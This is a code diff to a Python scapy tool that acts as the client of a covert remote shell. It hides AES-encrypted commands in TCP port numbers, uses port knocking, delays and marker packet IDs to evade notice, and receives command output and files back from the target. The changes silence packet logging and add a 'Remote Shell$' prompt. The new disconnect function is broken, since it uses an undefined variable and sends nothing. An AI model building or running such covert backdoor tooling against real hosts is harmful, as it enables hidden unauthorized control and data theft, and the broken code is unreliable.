@@ -4,6 +4,8 @@ import logging
 import binascii
 import collections
 import base64
+import sys
+import readline
 from random import uniform, randint
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -16,15 +18,15 @@ OUTPUT = collections.defaultdict(list)
 
 
 def encrypt_val(string):
-    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
-    encryptedData = base64.b64encode(objAES.encrypt(string))
-    return encryptedData
+	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+	encryptedData = base64.b64encode(objAES.encrypt(string))
+	return encryptedData
 
 
 def decrypt_val(string):
-    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
-    decryptedData = objAES.decrypt(base64.b64decode(string))
-    return decryptedData
+	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+	decryptedData = objAES.decrypt(base64.b64decode(string))
+	return decryptedData
 
 
 def verify_root():
@@ -55,20 +57,19 @@ def char_packet(dest, sport, char1, char2=None):
 		destport = ord(char1) << 8
 	else:
 		destport = (ord(char1) << 8) + ord(char2)
-	print(char1, char2, sport, destport)
 	return IP(dst=dest) / TCP(sport=sport, dport=destport)
 
 
 def knock(destIP, ports):
 	for port in ports:
 		packet = IP(dst=destIP) / TCP(dport=port)
-		send(packet)
+		send(packet, verbose=0)
 
 
 def send_end_msg(dest, sport):
 	randPort = randint(1500, 65535)
 	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=sport)
-	send(packet)
+	send(packet, verbose=0)
 
 
 def delay_sleep():
@@ -93,11 +94,15 @@ def get_result(packet):
 	sport = packet[2].sport
 	if(packet[1].id == 42424):
 		result = ''.join(OUTPUT[sport])
+		sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+35)+'\r')
+		print("Output from {}:".format(packet[1].src))
 		print(decrypt_val(result))
-		OUTPUT[sport] = ""
+		sys.stdout.write('[{}] Remote Shell$ '.format(args.destIP) + readline.get_line_buffer())
+		sys.stdout.flush()
+		del OUTPUT[sport]
 	elif(packet[1].id == 41414):
 		binary_to_file(OUTPUT[sport])
-		OUTPUT[sport] = ""
+		del OUTPUT[sport]
 	else:
 		dport = packet[2].dport
 		char1 = chr((dport >> 8) & 0xff)
@@ -113,11 +118,15 @@ def send_cmd(msg):
 	sport = generate_port()
 	for char1, char2 in zip(msg[0::2], msg[1::2]):
 		delay_sleep()
-		send(char_packet(args.destIP, sport, char1, char2))
+		send(char_packet(args.destIP, sport, char1, char2), verbose=0)
 	if(len(msg) % 2):
 		delay_sleep()
-		send(char_packet(args.destIP, sport, msg[len(msg) - 1]))
+		send(char_packet(args.destIP, sport, msg[len(msg) - 1]), verbose=0)
 	send_end_msg(args.destIP, sport)
+
+
+def disconnect():
+	packet = IP(dst=dest) / TCP(dport=4242)
 
 
 def scapySniff():
